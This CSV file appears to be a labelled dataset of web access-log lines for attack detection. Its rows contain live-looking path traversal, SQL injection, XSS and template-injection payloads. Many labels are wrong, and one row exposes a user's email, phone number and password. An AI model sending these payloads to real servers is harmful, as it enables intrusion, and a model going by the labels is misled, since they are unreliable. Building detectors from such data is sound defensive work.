source,text
"192.168.202.110 - - [16/Mar/2012:14:24:24 +0330] ""GET /examples/jsp/checkbox/bemarket/shop/index.php?pageurl=viewpage&filename=../../../../../../../../../../../../../../etc/passwd HTTP/1.1"" 404 1090 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",file upload
"10.172.152.13 - - [24/Mar/2018:19:26:56 +0330] ""GET /..../..../..../..../..../..../..../..../..../..../..../..../etc/passwd HTTP/1.1"" 404 363 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:56:50 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%20AND%20%28SELECT%205800%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7171767871%2C%28SELECT%20%28ELT%285800%3D5800%2C1%29%29%29%2C0x7171707a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29--%20GfjQ HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"5.101.40.234 - - [23/Jan/2019:06:54:30 +0330] ""GET /image/{{basketItem.id}}?type=productModel%29%20UNION%20ALL%20SELECT%20NULL--%20JEnW&wh=50x50 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"5.101.40.234 - - [23/Jan/2019:06:57:37 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%20AND%20SLEEP%285%29 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.238 - - [24/Mar/2018:21:51:15 +0330] ""GET /lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/viewcode.jse+httplist+httplist/../../../../../system/autoexec.ncf HTTP/1.1"" 404 233 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:55:44 +0330] ""GET /image/{{basketItem.id}}?type=productModel%27%29%20ORDER%20BY%201%23&wh=50x50 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"192.168.202.110 - - [16/Mar/2012:19:38:57 +0330] ""GET /phpmyadmin/cal_event.php?id=1' UNION SELECT 1,2,'calendarix_id_sql_injection.nasl',4,5,6,7,8,9,10,11,12,13-- HTTP/1.1"" 404 302 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.205 - - [25/Mar/2018:00:26:04 +0330] ""GET /popuplargeimage.asp?strImageTag=<script>foo</script> HTTP/1.1"" 302 0 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"10.128.0.205 - - [24/Mar/2018:21:45:00 +0330] ""GET /popuplargeimage.asp?strImageTag=<script>foo</script> HTTP/1.1"" 401 16 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"10.128.0.205 - - [24/Mar/2018:21:52:42 +0330] ""GET /_mem_bin/formslogin.asp?url=><script>alert('Vulnerable');</script> HTTP/1.1"" 404 1245 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"10.128.0.205 - - [24/Mar/2018:21:44:41 +0330] ""GET /\x80../\x80../\x80../\x80../\x80../\x80../winnt/win.ini HTTP/1.1"" 302 0 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.110 - - [16/Mar/2012:14:26:26 +0330] ""GET /scripts/index.php?action=view&filename=../../../../../../../../../../../../../etc/passwd HTTP/1.1"" 404 1006 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",file upload
"5.101.40.234 - - [23/Jan/2019:06:57:09 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%27%20AND%205505%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%285505%3D5505%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29%20AND%20%27XtFU%27%3D%27XtFU HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"5.101.40.234 - - [23/Jan/2019:06:59:03 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:21:44:48 +0330] ""GET /././././././../../../../../etc/passwd HTTP/1.1"" 400 226 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.172.152.13 - - [24/Mar/2018:19:26:51 +0330] ""GET /login_up.php3?login_name=x&passwd=x&locale_id=../../../../../../../../../../../../boot.ini\x00.jpg HTTP/1.1"" 404 1245 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:22:59:26 +0330] ""GET /Websense/cgi-bin/WsCgiLogin.exe?Page=login&UserName=nessus""><script>alert('websense_username_xss.nasl')</script> HTTP/1.1"" 404 7673 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"83.123.186.126 - - [22/Jan/2019:19:22:17 +0330] ""GET /customer/saveBasicInfo?id=&version=&csrf_token=7e3ad709a3cfdc4dd17dedb3ea0d4c2b67f69f11ada0efbb182426b91f6b798a&firstName=%D8%B3%DB%8C%D8%AF+%D9%85%D8%AD%D9%85%D8%AF+%D9%87%D8%A7%D8%AF%DB%8C&lastName=%D8%A8%D8%A7%D9%82%D8%B1%DB%8C+%D8%B1%D8%B3%D8%AA%D9%85%DB%8C&username=hb_1370%40yahoo.com&mobile=09112277325&password=150194998&password2=150194998&newsLettersSwitch=on HTTP/1.1"" 302 0 ""https://www.zanbil.ir/customer/saveBasicInfo?id=&version=&csrf_token=7e3ad709a3cfdc4dd17dedb3ea0d4c2b67f69f11ada0efbb182426b91f6b798a&firstName=%D8%B3%DB%8C%D8%AF+%D9%85%D8%AD%D9%85%D8%AF+%D9%87%D8%A7%D8%AF%DB%8C&lastName=%D8%A8%D8%A7%D9%82%D8%B1%DB%8C+%D8%B1%D8%B3%D8%AA%D9%85%DB%8C&username=hb_1370%40yahoo.com&mobile=09112277325&password=150194998&password2=159194998"" ""Mozilla/5.0 (Linux; Android 5.0.1; GT-I9505) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.80 Mobile Safari/537.36"" ""-""",Cross-Site Request Forgery
"10.128.0.205 - - [24/Mar/2018:21:44:48 +0330] ""GET /../../../../../../../../../../../../etc/passwd HTTP/1.1"" 404 244 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:41:48 +0330] ""GET /<script>foo</script> HTTP/1.1"" 403 1044 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"192.168.202.110 - - [16/Mar/2012:14:37:59 +0330] ""GET /cgi-bin/index.php?option=weblinks&Itemid=2&catid=-1 UNION SELECT 0,1,2,783842630348,4,5,6,7,8,9,10,11-- HTTP/1.1"" 404 294 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.205 - - [24/Mar/2018:21:40:21 +0330] ""GET /../../../../../../../../../../../../etc/passwd HTTP/1.1"" 400 321 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [25/Mar/2018:00:25:50 +0330] ""GET ../../../../../../../../../../../../winnt/win.ini HTTP/1.1"" 400 0 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Server-Side Request Forgery
"5.101.40.234 - - [23/Jan/2019:06:54:01 +0330] ""GET /image/{{basketItem.id}}?type=productModel%27%20AND%20SLEEP%285%29%20AND%20%27xuHK%27%3D%27xuHK&wh=50x50 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"192.168.202.110 - - [16/Mar/2012:18:32:33 +0330] ""GET /scripts/forums.asp?keywords=portalapp_sortby_sql_injection.nasl&do_search=1&sortby=users.user_name UNION SELECT 1,2,3,4,5,1331919222,48110,8,9,10,5,8897,13,14,15 FROM Users HTTP/1.1"" 404 1635 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"5.101.40.234 - - [23/Jan/2019:06:53:44 +0330] ""GET /image/{{basketItem.id}}?type=productModel%3BSELECT%20SLEEP%285%29%23&wh=50x50 HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"192.168.202.110 - - [16/Mar/2012:16:48:48 +0330] ""GET /scripts/admin/index.php?act=login&username=' UNION SELECT 1,'pafaq_10b4.nasl','5e0bd03bec244039678f2b955a2595aa','',0,'',''--&password=nessus HTTP/1.1"" 404 300 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.205 - - [24/Mar/2018:21:40:22 +0330] ""GET /../../../../../../../../../../../../etc/passwd HTTP/1.1"" 404 339 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.110 - - [16/Mar/2012:14:25:51 +0330] ""GET /examples/jsp/cal/?user=jffnms_user_sql_injection.nasl' UNION SELECT 2,'admin','$1$RxS1ROtX$IzA1S3fcCfyVfA9rwKBMi.','Administrator'--&file=index&pass= HTTP/1.1"" 404 1006 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.172.152.13 - - [24/Mar/2018:19:26:56 +0330] ""GET /../../../../../../../../../../../../winnt/win.ini HTTP/1.1"" 400 321 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:40:06 +0330] ""GET //surgeweb?username_ex=""><scri<script>alert(42);</script><input type=""hidden HTTP/1.1"" 302 0 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"10.128.0.238 - - [24/Mar/2018:21:51:21 +0330] ""GET /index.html?urlmaskfilter=<script>foo</script> HTTP/1.1"" 302 0 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"192.168.202.110 - - [16/Mar/2012:14:24:46 +0330] ""GET /examples/jsp/jsp2/jspx/guestbook.php?lang=de&mode=new&quote=-1 UNION SELECT 0,0,username,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 FROM simpgb_users WHERE 1 HTTP/1.1"" 404 1063 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"5.101.40.234 - - [23/Jan/2019:06:53:02 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50 HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"5.101.40.234 - - [23/Jan/2019:06:54:27 +0330] ""GET /image/{{basketItem.id}}?type=productModel%20AND%202960%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28119%29%7C%7CCHR%2899%29%7C%7CCHR%28117%29%7C%7CCHR%28101%29%2C5%29--%20yRyO&wh=50x50 HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.238 - - [23/Mar/2018:19:01:31 +0330] ""GET /api/set/1/tax57{{641*678}}yv7ad?value=10000 HTTP/1.1"" 404 233 ""-"" ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0"" ""-""",Server-Side Template Injection
"192.168.202.110 - - [16/Mar/2012:14:22:29 +0330] ""GET /cgi-bin/?user=jffnms_user_sql_injection.nasl' UNION SELECT 2,'admin','$1$RxS1ROtX$IzA1S3fcCfyVfA9rwKBMi.','Administrator'--&file=index&pass= HTTP/1.1"" 403 290 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.205 - - [25/Mar/2018:00:25:51 +0330] ""GET /scripts/fake.cgi?arg=/dir/../../../../../etc/passwd HTTP/1.1"" 302 0 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:40:14 +0330] ""GET /scripts/fake.cgi?arg=/dir/../../../../../../../../../../../winnt/win.ini HTTP/1.1"" 404 7615 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"40.77.188.238 - - [24/Jan/2019:23:53:42 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50 HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"" ""-""",Server-Side Template Injection
"192.168.202.138 - - [17/Mar/2012:19:17:25 +0330] ""GET /cgi-bin/parse_xml.cgi?action=login&filename=frameset.html|id\x00| HTTP/1.1"" 404 299 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",file upload
"5.101.40.234 - - [23/Jan/2019:06:55:28 +0330] ""GET /image/{{basketItem.id}}?type=productModel%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%23&wh=50x50 HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:21:42:05 +0330] ""GET /ldap/cgi-bin/ldacgi.exe?Action=Substitute&Template=../../../../../boot.ini&Sub=LocalePath&LocalePath=enus1252 HTTP/1.1"" 404 1245 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:54:56 +0330] ""GET /image/{{basketItem.id}}?type=productModel%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20ZpwO&wh=50x50 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"5.101.40.234 - - [23/Jan/2019:06:56:37 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%22.%27.%2C%28.%22%29%29 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:21:44:41 +0330] ""GET /../../../../../../../../../../../../etc/passwd HTTP/1.1"" 400 0 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:49:19 +0330] ""GET /../../../../../../../../../../../../etc/passwd HTTP/1.1"" 403 312 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:42:11 +0330] ""GET /index.html?urlmaskfilter=<script>foo</script> HTTP/1.1"" 404 1245 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"5.101.40.234 - - [23/Jan/2019:06:56:04 +0330] ""GET /image/{{basketItem.id}}?type=productModel%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%23&wh=50x50 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:21:40:18 +0330] ""GET /..../..../..../..../..../..../..../..../..../..../..../..../etc/passwd HTTP/1.1"" 404 346 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.110 - - [16/Mar/2012:15:48:59 +0330] ""GET /cgi-bin/index.php?x=browse&category='UNION SELECT '1','2','pixelpost_category_sql_injection.nasl','1331909407','5'-- HTTP/1.1"" 404 294 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"192.168.202.110 - - [16/Mar/2012:14:26:27 +0330] ""GET /examples/jsp/sessions/evb/check_url.php?url=pligg_url_sql_injection.nasl' UNION SELECT 1331904454,1014388214 --  HTTP/1.1"" 404 317 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
